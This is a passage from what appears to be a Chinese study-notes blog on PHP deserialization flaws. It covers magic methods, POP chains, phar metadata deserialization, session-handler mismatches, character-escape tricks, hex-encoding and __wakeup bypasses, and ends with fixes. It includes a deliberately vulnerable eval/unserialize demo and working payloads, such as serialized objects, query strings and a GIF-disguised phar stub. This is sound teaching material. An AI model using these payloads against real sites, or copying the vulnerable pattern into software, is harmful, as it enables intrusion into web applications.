class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">18</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="variable">$student</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//Uncaught Error: Function name must be a string</span></span><br></pre></td></tr></table></figure><p>​如果在类中定义了__invoke() 方法，那么它会在实例当作方法来使用时自动调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;调用了__invoke()方法&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Inf0&quot;</span>, <span class="number">18</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="variable">$student</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：调用了__invoke()方法</span></span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>​PHP 反序列化漏洞的成因在于代码中 unserialize() 接收的参数可控，通过篡改反序列化字符串中类的变量的值实现攻击，其中关键之处在于：</p><ul><li>存在可利用的魔术方法</li><li>存在危险函数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demo_test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test = <span class="keyword">new</span> <span class="title function_ invoke__">func1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;实例已销毁！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func2_test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;func2_test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​构造 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demo_test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test = <span class="keyword">new</span> <span class="title function_ invoke__">func2</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test-&gt;func2_test = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;实例已销毁！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func2_test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;func2_test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">demo</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:4:&quot;demo&quot;:1:&#123;s:9:&quot;demo_test&quot;;O:5:&quot;func2&quot;:1:&#123;s:10:&quot;func2_test&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>传入 payload：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/1.png"></p><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><p>​POP(Property-Oriented Programing) 面向属性编程。根据上层语言构造特定调用链，从现有运行环境中寻找一系列代码，然后根据需求构成一组连续的调用链，达到攻击者的目的。</p><h2 id="phar反序化"><a href="#phar反序化" class="headerlink" title="phar反序化"></a>phar反序化</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>​<code>.phar</code> 后缀的文件是一种压缩文件，以序列化的形式存储用户自定义的 meta-data 。</p><p>​注意需要将 php.ini 中的 phar.readonly 设置为 Off，否则无法生成 phar 文件。</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/2.png"></p><p>​运行以下代码，将在同一文件夹下生成 phar.phar 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;data = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>stub：可以理解为 phar 文件的标志。其实就是一个 PHP 文件，必须以 <code>__HALT_COMPILER();</code> 或 <code>__HALT_COMPILER();?&gt;</code> 结尾。</li><li>addFromString(“localname”, “contents”)：localname 压缩文件将存储在 phar 文件中的路径，contents 要存储的文件内容。这两个在你的计算机中是可以不存在的。</li></ul><p>​查看生成的 phar 文件：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/3.png"></p><p>​PHP 一大部分的文件系统函数在通过 phar:&#x2F;&#x2F; 伪协议解析 phar 文件时，都会将 meta-data 反序列化，受影响的函数如下：</p><table><thead><tr><th align="left">受影响的函数列表</th><th align="left"></th><th align="left"></th><th></th></tr></thead><tbody><tr><td align="left">fileatime</td><td align="left">filectime</td><td align="left">file_exists</td><td>file_get_contents</td></tr><tr><td align="left">file_put_contents</td><td align="left">file</td><td align="left">filegroup</td><td>fopen</td></tr><tr><td align="left">fileinode</td><td align="left">filemtime</td><td align="left">fileowner</td><td>fikeperms</td></tr><tr><td align="left">is_dir</td><td align="left">is_executable</td><td align="left">is_file</td><td>is_link</td></tr><tr><td align="left">is_readable</td><td align="left">is_writable</td><td align="left">is_writeable</td><td>parse_ini_file</td></tr><tr><td align="left">copy</td><td align="left">unlink</td><td align="left">stat</td><td>readfile</td></tr></tbody></table><p>​测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：hello</span></span><br></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>​已知 PHP 识别 phar 文件是通过识别 stub 是否存在，确切的说是 <code>__HALT_COMPILER();</code> 或 <code>__HALT_COMPILER();?&gt;</code>，对 stub 前面的内容及后缀名是否是 .phar 没有要求。</p><p>​基于上面的例子，我们改为 <code>setStub(&quot;GIF89a&lt;?php __HALT_COMPILER();?&gt;&quot;)</code> 、 <code>$o-&gt;data=phpinfo();</code> 。如果将 phar.phar 改为 phar.gif ，则可以绕过某些文件上传的检测，配合其他漏洞可能获得 shell 。</p><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>session.save_path</td><td>session保存路径</td></tr><tr><td>session.serialize_handler</td><td>session序列化存储所用处理器，默认为php</td></tr><tr><td>session.use_trans_sid</td><td>指定是否启用透明SID支持，默认为0（禁用）。通俗的说，当值为1时，只要浏览器不关闭，同一域名下的不同页面将使用同一个session文件</td></tr></tbody></table><p>session.serialize_hanlder 的参数值：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名|键值序列化的结果</td></tr><tr><td>php_binary</td><td>键名长度对应的ASCII字符(+)键名(+)键值序列化的结果</td></tr><tr><td>php_serialize</td><td>将键-值做为数组的键-值，然后序列化处理该数组的结果</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$_SESSION[&#x27;name&#x27;] = &quot;Tom&quot;;</span></span><br><span class="line"><span class="comment">#php</span></span><br><span class="line">name|s:<span class="number">3</span>:<span class="string">&quot;Tom&quot;</span></span><br><span class="line"><span class="comment">#php_binary</span></span><br><span class="line">names:<span class="number">3</span>:<span class="string">&quot;Tom&quot;</span> <span class="comment">//ascii中4是保留字符，无法显示</span></span><br><span class="line"><span class="comment">#php_serialize</span></span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Tom&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h3><p>​如果 PHP 在序列化存储 session 数据时使用的处理器和反序列化时使用的处理器不一样，会导致数据无法正确地反序列化。</p><p>​如 <code>$_SESSION[&#39;hello&#39;] = &#39;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#39;;</code> ，在存储时使用的处理器为 php_serialize，则将存储为 <code>a:1:&#123;s:5:&quot;hello&quot;;s:19:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</code> 。如果在读取数据时如果使用的反序列化处理器是 php ，那么反序列化后的数据将会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:5:&quot;</span>hello<span class="string">&quot;;s:20:&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(<span class="built_in">stdClass</span>)<span class="comment">#1 (0) &#123;&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(stdClass)#1 (0) &#123;&#125; 表示这是一个stdClass类的对象，#1表示是脚本中创建的第一个此类对象，(0)表示这个对象没有任何属性</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>​原本应该反序列化为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;hello&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;|O:8:&quot;</span><span class="built_in">stdClass</span><span class="string">&quot;:0:&#123;&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​实际中，当 session.auto_start&#x3D;On 时，将自动开启 session 会话（相当于执行了session_start()）。因为该过程发生在 PHP 代码执行前，所以在代码中将要设定的 session 相关配置是不起作用的，因此一些需要在代码中设置 session 序列化处理器的程序会先销毁自动生成的 session 会话，然后设置 session 序列化处理器，再调用 session_start() 开启 session 会话。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;session.auto_start&#x27;</span>)==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//some codes</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h1><p>​PHP 在反序列化时，以 <code>;</code> 作为分隔符，<code>&#125;</code> 作为结束符（字符串里的除外），并且根据长度判断内容 。反序列化过程中必须严格按照序列化规则才能成功反序列化 。</p><h2 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/p/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&quot;WW&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="number">24</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换前，序列化：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)); <span class="comment">//替换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进行替换后：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换后，反序列化：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>username 中没有 p 时，一切正常：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/6.png"></p><p>如果有 p ，一个 p 将替换为 ww ，字符增多，不符合严格的序列化规则，将报错：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/7.png"></p><p>如果想把年龄修改为 18 ，那么可以通过构造 username 的值来使得 age 改变：</p><ol><li><p>构造 age 为 18 时的序列化结果 <code>&quot;;i:1;i:18;&#125;</code> ，前面的 <code>&quot;</code> 是为了闭合前一个元素 username 的值，最后的 <code>&#125;</code> 是为了闭合整个序列化字符串，抛弃后面的内容。</p></li><li><p>数一下上面构造的内容有多少个字符，这里有 12 个，因此通过 filter() 替换后需要变多 12 个字。由于一个 p 会变成 2 个 w 字符，即每一个 p 替换后会多出一个字符，所以这里需要 12 个 p 。</p></li><li><p>payload：<code>?username=pppppppppppp&quot;;i:1;i:18;&#125;</code></p></li></ol><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/8.png"></p><h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/xx/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;s&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换前，序列化：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)); <span class="comment">//替换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进行替换后：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换后，反序列化：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果想在数组里插入一个值 <code>hello</code> （序列化结果为 <code>s:5:&quot;hello&quot;;&#125;</code> ），那么只能将 age 吞噬。</p><p>payload：<code>?username=maasxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=a&quot;;i:1;s:5:&quot;hello&quot;;&#125;</code> 。</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/9.png"></p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h2><p>​将序列化字符串的 s 改为大写 S ，反序列化时就会解析 16 进制数据。如：<code>O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code> ，可改为 <code>O:4:&quot;Test&quot;:1:&#123;S:3:&quot;\x63md&quot;;S:6:&quot;\x77hoami&quot;;&#125;</code> 。</p><h2 id="利用wakeup-函数的特点"><a href="#利用wakeup-函数的特点" class="headerlink" title="利用wakeup()函数的特点"></a>利用wakeup()函数的特点</h2><p>​如果序列化字符串中表示变量个数的值大于真实的变量个数时会跳过 __wakeup 的执行。</p><p>​影响版本：PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10 。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li>严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能。</li><li>对可能产生危害的地方的属性的值进行严格的过滤。</li><li>加固文件上传模块的防护，防止触发 phar 反序列化漏洞。</li><li>设置 session_use_trans_sid&#x3D;0 ，禁止跨页面访问 session 。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;h2 id=&quot;序列-反序列化函数&quot;&gt;&lt;a href=&quot;#序列-反序列化函数&quot; class=&quot;headerlink&quot; title=&quot;序列&amp;#x2F</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE漏洞学习</title>
    <link href="http://example.com/2023/12/17/RCE/"/>
    <id>http://example.com/2023/12/17/RCE/</id>
